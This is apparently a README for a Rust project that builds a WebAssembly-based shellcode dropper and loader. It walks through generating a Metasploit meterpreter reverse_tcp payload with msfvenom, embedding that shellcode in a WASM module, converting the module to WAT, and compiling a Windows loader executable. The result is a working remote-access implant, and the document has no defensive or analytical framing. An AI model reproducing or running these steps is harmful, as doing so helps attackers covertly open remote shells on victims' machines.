# Metasploit WASM Executor

## Dependencies
```sh
cargo install wasm-pack
```

## Install Wasm2Wat Windows
```sh
curl -L -o wabt.tar.gz https://github.com/WebAssembly/wabt/releases/latest/download/wabt-1.0.37-windows.tar.gz
```

## Install `Wasm2Wat` Linux
```sh
curl -L -o wabt.tar.gz https://github.com/WebAssembly/wabt/releases/latest/download/wabt-1.0.37-ubuntu-20.04.tar.gz
tar -xzf wabt.tar.gz
```

- First, we need to get some shellcode from Metasploit
```sh
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LISTENER IP ADDR> LPORT=<LISTNER PORT> -f rust
```

- Copy the output from that command into `./wasm_dropper/src/lib.rs` 
- Name it `WASM_MEMORY_BUFFER` and change the const to be static
- `WASM_MEMORY_BUFFER` should have the following signature:

```rust
static WASM_MEMORY_BUFFER: [u8; WASM_MEMORY_BUFFER_SIZE] = [
    0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,
    ...
];
```

## Build the wasm binary
```sh
cd wasm_dropper && wasm-pack build --release && cd ..
```

## Now convert the wasm binary from .wasm to .wat using `wasm2wat`
```sh
./wabt/bin/wasm2wat.exe ./wasm_dropper/target/wasm32-unknown-unknown/release/wasm_dropper.wasm -o ./wasm_loader/src/wasm_dropper.wat
```

## Now build the Loader
```sh
cd wasm_loader && cargo build --release && cd ..
```

## The Loader Binary is now in `./wasm_loader/target/release/wasm_loader.exe`
